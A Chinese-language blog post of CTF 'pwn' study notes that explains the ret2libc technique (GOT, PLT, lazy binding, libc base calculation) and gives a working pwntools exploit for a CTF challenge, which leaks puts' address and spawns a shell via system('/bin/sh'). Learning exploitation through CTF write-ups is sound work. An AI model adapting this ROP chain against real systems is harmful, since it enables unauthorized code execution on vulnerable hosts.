---
title: pwn学习记录（其三）
tags:
  - CTF
  - pwn
date: 2025-11-9
categories:
  - CTF
abbrlink: 9d440e51
---
# ret2libic
> 如果程序中没有system函数，在libc里找到system，使用输出libc其中的函数地址，从而计算基地址，来利用libc中的system("/bin/sh")
## 实现步骤
* 找到一个函数的真实地址，使程序打印并回到函数开始的地方
* 根据基地址计算函数的偏移地址
* 确认system函数和"/bin/sh"字符串在libc库中的偏移地址
*计算真实地址
* 劫持程序的执行流程，让程序执行system("/bin/sh")
## 前提
* 全局偏移量表(GOT)
全局偏移量表（GOT）是一个在程序的数据段中的表，它存储了程序中所有需要动态链接的函数和变量的地址。当程序第一次调用一个动态链接的函数时，动态链接器会查找该函数在动态链接库中的地址，然后将这个地址存储在GOT表中的相应条目中。这样，当程序再次调用这个函数时，它就可以直接从GOT表中获取这个函数的地址，而不需要再次进行查找。
* 程序链接表(PLT)
程序链接表（PLT）是一个在程序的代码段中的表，它包含了一系列的跳转指令，这些指令用于跳转到GOT表中的相应条目。当程序需要调用一个动态链接的函数时，它会首先跳转到PLT表中的相应条目，然后通过这个条目跳转到GOT表中的相应条目，最后跳转到这个函数在动态链接库中的实际地址。
* 延迟绑定
只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，我们才能够通过got表读取到libc中的函数。
* 偏移地址
libc是Linux系统下的C函数库，其中就会有system()函数、"/bin/sh"字符串，而libc库中存放的就是这些函数的偏移地址。
* 基地址
每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。
这次运行程序的基地址 = 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址
## 实战(以TSCTF-J pop 为例)
### 泄露libc基址

  vuln = 0x400626
  pop_rdi_ret = 0x0000000000400713
  puts_got = elf.got['puts']
  puts_plt = elf.plt['puts']
  pl = p64(0)*3 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
  p.sendlineafter(b'time!\n',pl)
选择puts函数，劫持程序打印puts函数的真实地址
计算libc的真实地址``libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x6f6a0``
### 劫持程序运行system("/bin/sh")

  binsh = next(libc.search(b'/bin/sh'))
  system = libc.sym['system']
  pl = p64(0)*3 + p64(pop_rdi_ret) + p64(binsh) + p64(system)
  p.sendlineafter(b'time!\n',pl)
获取"bin/sh"和system的真实地址，跳回vuln函数开头，执行system("/bin/sh")

### 官方wp

from pwn import *
p = remote('10.21.131.92',33783)
#p = remote('127.0.0.1',1337)
#p = process('./pwn')
libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
context(os='linux',arch='amd64',log_level='debug')
def exp():
    vuln = 0x400626
    pop_rdi_ret = 0x0000000000400713
    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']
    pl = p64(0)*3 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
    p.sendlineafter(b'time!\n',pl)
    libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x6f6a0
    binsh = next(libc.search(b'/bin/sh'))
    system = libc.sym['system']
    pl = p64(0)*3 + p64(pop_rdi_ret) + p64(binsh) + p64(system)
    p.sendlineafter(b'time!\n',pl)
    log.success('libc_base:'+hex(libc.address))
    #gdb.attach(p)
    p.interactive()
if __name__ == '__main__':
    exp()
